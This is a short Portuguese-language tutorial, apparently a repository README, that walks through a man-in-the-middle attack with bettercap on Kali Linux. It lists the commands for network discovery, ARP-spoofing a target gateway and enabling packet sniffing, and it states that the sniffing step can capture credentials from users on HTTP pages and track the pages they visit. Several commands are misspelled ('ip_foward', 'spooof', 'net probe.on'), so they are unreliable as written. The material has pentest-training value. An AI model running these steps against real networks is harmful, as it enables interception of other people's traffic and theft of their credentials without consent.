# Bettercap

O bettercap é uma ferramenta valiosa em um pentest, e pode ser encontrada no Kali Linux, a sua finalidade é o Ataque Mitm Man-In-the-Middle.
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
Nesse tutorial você irá acompanhar como executar o processo de um ataque mitm e,  dentro desse repósitório há uma gama de fotos que ilustra o passo a passo citado.

1- **cat /proc/sys/net/ipv4/ip_foward** | Após rodar esse comando ele irá retornar o numero 0 para você.

2- **arp -a** | Ao executar esse comando você ira visualizar uma tabela onde sua interface, "dispositivo" está conectado. E em seguida irá visualizar todos os endereços de hosts disponiveis e que pertence aquela interface. 

3- **net probe.on** | Ao executar o comando o mesmo irá efetuar uma  detecção de equipamentos na rede, atráves de envios de pacotes de "sonda"

4- **net.show** |Ao executar exibe todos os hosts que foram reconhecidos na rede.

5 -**set arp spooof.targets** | para definir o alvo do ataque, nessa parte do processo é importante você identificar o AP e replicar o endereço Ex.**: 192.168.0.1**
5.1- arp.spoof on | Para iniciar o ataque. 

6- **cat /proc/sys/net/ipv4/ip_foward** | Execute novamente esse comando e ele ira retorna o numero 1 para você. resultado 1 significa que o encaminhamento de pacotes já está ativado 

7-**net.sniff on** | Ao executar o comando  ele irá coleta os protocolos e é possível coletar credenciais se o usuário acessar paginas http. Serve para monitorar quais paginas o usuário também está acessando  

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
Fonte: https://www.bettercap.org/
